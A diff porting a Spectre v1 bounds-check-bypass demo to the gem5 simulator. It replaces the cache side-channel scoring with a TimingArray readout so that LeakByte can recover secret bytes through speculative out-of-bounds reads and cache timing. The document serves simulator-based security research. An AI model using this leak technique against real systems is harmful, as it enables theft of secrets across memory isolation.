@@ -12,10 +12,20 @@
 #include <array>
 #include <cstring>
 #include <iostream>
+#include <memory>
 
-#include "cache_sidechannel.h"
+// gem5 adaptation: this demo originally read its side channel through
+// CacheSideChannel::RecomputeScores(), which only scores a sample when
+// exactly one oracle entry reads as a cache hit. Under gem5 that condition
+// never holds -- 16-21 entries read fast on every call, with no variance --
+// so every sample is discarded, scores_ never increments, and the demo can
+// neither converge nor reach its own "does not converge" bound. It is ported
+// here to the TimingArray readout that upstream's spectre_v1_pht_sa already
+// uses, which has no such validity filter. See ../README-gem5.md.
+
 #include "instr.h"
 #include "local_content.h"
+#include "timing_array.h"
 #include "utils.h"
 
 constexpr size_t kArrayLength = 64;
@@ -29,14 +39,13 @@ constexpr size_t kArrayLength = 64;
 // execution, bypassing the bounds check by training the branch predictor to
 // think that the value will be in-range.
 static char LeakByte(const char *data, size_t offset) {
-  CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
+  TimingArray timing_array;
   std::unique_ptr<std::array<size_t *, kArrayLength>> array_of_pointers =
       std::unique_ptr<std::array<size_t *, kArrayLength>>(
           new std::array<size_t *, kArrayLength>);
 
   for (int run = 0;; ++run) {
-    sidechannel.FlushOracle();
+    timing_array.FlushFromCache();
 
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
@@ -79,18 +88,16 @@ static char LeakByte(const char *data, size_t offset) {
       // Speculative fetch at the local_offset. Architecturally it fetches
       // always at the safe_offset, though speculatively it prefetches the
       // unsafe offset when i is at the local_pointer_index.
-      ForceRead(oracle.data() + static_cast<size_t>(
-          data[local_offset]));
+      ForceRead(&timing_array[data[local_offset]]);
     }
 
-    std::pair<bool, char> result =
-        sidechannel.RecomputeScores(data[safe_offset]);
-    if (result.first) {
-      return result.second;
+    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
+    if (ret >= 0 && ret != data[safe_offset]) {
+      return ret;
     }
 
     if (run > 100000) {
-      std::cerr << "Does not converge " << result.second << std::endl;
+      std::cerr << "Does not converge" << std::endl;
       exit(EXIT_FAILURE);
     }
   }
